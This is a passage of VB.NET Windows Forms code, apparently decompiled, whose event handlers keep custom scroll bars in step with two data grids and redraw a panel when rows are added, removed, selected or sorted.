            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowsAdded(ByVal sender As Object, ByVal e As DataGridViewRowsAddedEventArgs) Handles ViewManager.RowsAdded
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowsRemoved(ByVal sender As Object, ByVal e As DataGridViewRowsRemovedEventArgs) Handles ViewManager.RowsRemoved
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq1 = e.Row.Index + 1
                Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq1 = 0
        Else
            Me.aq1 = 1
        End If
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.ViewManager.HorizontalScrollingOffset <> -1) Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioHorizontalScrollBar2_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar2.Scroll
        Try
            If (Me.DataGridView1.HorizontalScrollingOffset <> -1) Then
                Me.DataGridView1.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar2.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar2_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar2.Scroll
        Try
            If (Me.DataGridView1.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar2.Value
            End If
        Catch exception As System.Exception
            If (Me.DataGridView1.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
            End If
        End Try
    End Sub
End Class